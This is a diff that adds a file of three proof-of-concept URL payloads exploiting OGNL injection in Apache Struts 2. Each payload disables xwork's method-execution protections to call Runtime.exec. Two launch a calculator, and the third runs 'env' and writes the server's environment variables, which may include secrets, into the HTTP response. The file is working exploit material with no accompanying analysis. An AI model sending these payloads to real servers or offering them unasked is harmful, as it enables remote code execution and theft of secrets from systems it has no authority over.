@@ -1,0 +1,9 @@
+POC1:
+/test?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27open+-a+calculator%27%29%29%28meh%29&z[%28foo%29%28%27meh%27%29]=true
+
+POC2:
+/test?
+foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27open+-a+calculator%27%29%29%28meh%29&top["foo"]%280%29
+
+POC3:
+name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23a=@java.lang.Runtime@getRuntime().exec(%27env%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a), %23c=new+java.io.BufferedReader(%23b), %23d=new+char[51200],%23c.read(%23d), %23q=@org.apache.struts2.ServletActionContext@getResponse().getWriter(), %23q.println(%23d), %23q.close())(racr)&z[(name)(%27meh%27)]
